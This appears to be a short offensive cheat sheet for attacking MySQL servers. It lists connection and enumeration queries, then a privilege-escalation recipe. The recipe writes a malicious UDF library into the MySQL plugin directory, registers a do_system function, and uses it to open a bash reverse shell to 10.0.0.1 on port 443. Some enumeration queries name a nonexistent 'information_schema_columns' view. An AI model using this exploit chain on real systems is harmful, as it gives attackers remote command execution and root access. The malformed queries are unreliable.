## TCP 3306 mysql

### Connecting to Mysql  
```mysql -u user --password db_name```

### MySQL Commands
```
# Get the db version information
SELECT @@VERSION; 

# Comment (Note the space)
-- comment 
or
#comment
or
/*comment*/

# Enumerating db contents
# Listing the tables
SELECT * FROM information_schema.tables
or
SELECT TABLE_NAME FROM information_schema.tables

# Listing columns
SELECT * FROM information_schema_columns WHERE table_name = 'TABLE_NAME'
or
SELECT column_name FROM information_schema_columns WHERE table_name = 'TABLE_NAME'
```

### Privilege Escalation

Mysql 4.x & 5.0 (requires valid creds) - [dynamic library for do_system() MySQL UDF-raptor_udf2.c](https://www.exploit-db.com/exploits/1518)
```mysql> create table foo(line blob);
mysql> insert into foo values(load_file(‘/tmp/exploit.so’));
mysql> select * from foo into dumpfile ‘/usr/lib/mysql/plugin/exploit.so’;
mysql> create function do_system returns integer soname ‘exploit.so’;
mysql> select do_system(‘bash -i >& /dev/tcp/10.0.0.1/443 0>&1’);
```
REF: [mysql system to root](https://recipeforroot.com/mysql-to-system-root/)
